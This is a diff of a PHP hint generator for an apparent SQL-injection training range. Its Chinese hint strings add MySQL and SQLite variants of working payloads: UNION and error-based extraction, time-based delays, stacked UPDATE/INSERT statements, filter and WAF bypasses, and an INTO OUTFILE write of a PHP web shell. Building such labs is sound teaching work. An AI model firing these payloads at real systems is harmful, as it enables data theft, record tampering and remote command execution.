@@ -7,7 +7,7 @@
 
 declare(strict_types=1);
 
-$sql = file_get_contents(__DIR__ . '/database/seeds/02_challenges.sql');
+$sql = file_get_contents(dirname(__DIR__) . '/database/seeds/02_challenges.sql');
 preg_match_all("/\('([^']+)',\s*'([^']+)',\s*'(\w+)',\s*'(\w+)',\s*(\d+),\s*'([^']+)'/", $sql, $matches, PREG_SET_ORDER);
 
 $inserts = [];
@@ -25,7 +25,7 @@ foreach ($matches as $m) {
         $cost = $level === 1 ? 0 : ($level === 2 ? 5 : 15);
         $inserts[] = sprintf(
             "('%s', %d, '%s', %d, %d)",
-            $id, $level, addslashes($content), $cost, $level
+            $id, $level, str_replace("'", "''", $content), $cost, $level
         );
         $count++;
     }
@@ -47,7 +47,7 @@ foreach ($chunks as $i => $chunk) {
     $output .= implode(",\n", $chunk) . ";\n";
 }
 
-file_put_contents(__DIR__ . '/database/init/03_hints.sql', $output);
+file_put_contents(dirname(__DIR__) . '/database/init/03_hints.sql', $output);
 echo "✅ 已生成 {$count} 条提示数据到 database/init/03_hints.sql\n";
 
 /**
@@ -68,13 +68,13 @@ function generateHintsForCategory(string $category): array
         ],
         'sqli_union' => [
             1 => '本关支持多表联合查询',
-            2 => '使用 UNION SELECT 拼接新查询',
-            3 => 'Payload: ?id=1\' UNION SELECT 1,version(),3-- -',
+            2 => '使用 UNION SELECT 拼接新查询；查系统表 MySQL 用 information_schema，SQLite 用 sqlite_master',
+            3 => 'Payload: ?id=1\' UNION SELECT 1,version(),3-- -（SQLite 用 sqlite_version()）',
         ],
         'sqli_error' => [
             1 => '数据库错误信息会直接显示',
-            2 => '利用 extractvalue() 或 updatexml() 函数触发错误',
-            3 => 'Payload: ?id=1\' AND extractvalue(1,concat(0x7e,version()))-- -',
+            2 => '报错取数：MySQL 用 extractvalue()/updatexml() 触发报错回显；SQLite 无等价函数（MySQL 专属手法）',
+            3 => 'Payload (MySQL): ?id=1\' AND extractvalue(1,concat(0x7e,version()))-- -；SQLite 下可提交 1\' 观察报错回显与后端数据库指纹',
         ],
         'sqli_bool' => [
             1 => '页面只会显示存在或不存在两种状态',
@@ -83,8 +83,8 @@ function generateHintsForCategory(string $category): array
         ],
         'sqli_time' => [
             1 => '查询条件会影响响应时间',
-            2 => '使用 SLEEP() 函数触发延迟',
-            3 => 'Payload: ?name=admin\' AND IF(1=1,SLEEP(5),0)-- -',
+            2 => 'MySQL 用 SLEEP() 制造延迟；SQLite 无 SLEEP()，用重型递归 CTE 消耗 CPU 制造延迟',
+            3 => 'Payload (MySQL): ?name=admin\' AND IF(1=1,SLEEP(5),0)-- -；Payload (SQLite): ?name=admin\' AND (SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 20000000) SELECT x FROM c))>0-- -',
         ],
         'sqli_stacked' => [
             1 => '本关可能支持多语句执行',
@@ -92,9 +92,9 @@ function generateHintsForCategory(string $category): array
             3 => 'Payload: ?id=1\'; INSERT INTO logs(msg) VALUES(\'hacked\')-- -',
         ],
         'sqli_gbk' => [
-            1 => '数据库使用 GBK 编码',
-            2 => '宽字节 (\xbf\x27) 可吃掉 addslashes 添加的反斜杠',
-            3 => 'Payload: ?id=%bf%27 OR 1=1-- -',
+            1 => '数据库使用 GBK 编码（宽字节为 MySQL 专属特性，SQLite 恒为 UTF-8）',
+            2 => 'MySQL GBK 下宽字节 (%bf%27) 可吃掉 addslashes 的反斜杠；SQLite 中反斜杠不是转义符，addslashes 完全不防注入',
+            3 => 'Payload (MySQL): ?id=%bf%27 OR 1=1-- -；Payload (SQLite): ?id=1\' OR 1=1-- -',
         ],
         'sqli_second' => [
             1 => '注册时输入的数据在后续查询中被使用',
@@ -103,28 +103,28 @@ function generateHintsForCategory(string $category): array
         ],
         'sqli_filter' => [
             1 => '服务端会过滤 union、select 等关键字',
-            2 => '尝试双写（ununionion selselectect）或内联注释（/*!...*/）',
-            3 => 'Payload: ?id=-1\' ununionion selselectect 1,2-- -',
+            2 => '双写绕过（ununionion selselectect）双驱动通用；内联注释拼接（uni/**/on）利用 MySQL 词法特性，SQLite 不可用',
+            3 => 'Payload: ?id=-1 ununionion selselectect 1-- -（UNION 列数需与主查询一致）',
         ],
         'sqli_waf' => [
             1 => '有 WAF 检测关键字',
-            2 => '尝试大小写、内联注释、HTTP 参数污染',
-            3 => 'Payload: ?id=-1\' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -',
+            2 => 'MySQL 用内联注释拼接（uni/**/on）绕过；SQLite 将注释视为空白，可用黑名单未拦的恒真式（OR 1=1）绕过',
+            3 => 'Payload (MySQL): ?id=-1 uni/**/on sel/**/ect version()-- -；Payload (SQLite): ?id=1 OR 1=1-- -',
         ],
         'sqli_multi' => [
-            1 => 'mysqli_multi_query 支持多语句',
+            1 => '演示环境以 PDO 多语句模拟（原 mysqli_multi_query）',
             2 => '使用分号分隔多个语句',
             3 => 'Payload: ?id=1; UPDATE demo_users SET balance=99999 WHERE id=1',
         ],
         'sqli_getshell' => [
-            1 => '通过 SQL 注入写入 WebShell',
-            2 => '使用 INTO OUTFILE 写入 PHP 文件到 web 目录',
-            3 => 'Payload: ?id=1\' UNION SELECT \'<?php system($_GET[c]);?>\' INTO OUTFILE \'/var/www/html/shell.php\'',
+            1 => '通过 SQL 注入写入 WebShell（INTO OUTFILE 为 MySQL 专属，需 FILE 权限；SQLite 无等价手法）',
+            2 => 'MySQL 用 INTO OUTFILE 写 PHP 文件到 web 目录；SQLite 可拓展了解 ATTACH DATABASE 写文件思路',
+            3 => 'Payload (MySQL): ?id=1\' UNION SELECT \'<?php system($_GET[c]);?>\' INTO OUTFILE \'/var/www/html/shell.php\'',
         ],
         'sqli_comprehensive' => [
             1 => '本关需要综合运用多种 SQL 注入技术',
-            2 => '从 UNION 注入到 GetShell 完整链路',
-            3 => 'Payload: 通过 UNION 注入获取数据库路径 → INTO OUTFILE 写入 WebShell',
+            2 => '从 UNION 注入到 GetShell 完整链路（GetShell 依赖 MySQL FILE 权限，SQLite 无等价）',
+            3 => 'Payload (MySQL): UNION 注入获取数据库路径 → INTO OUTFILE 写入 WebShell；SQLite 下仅可练习数据提取',
         ],
         'xss_reflected' => [
             1 => '本关输入会被原样回显',
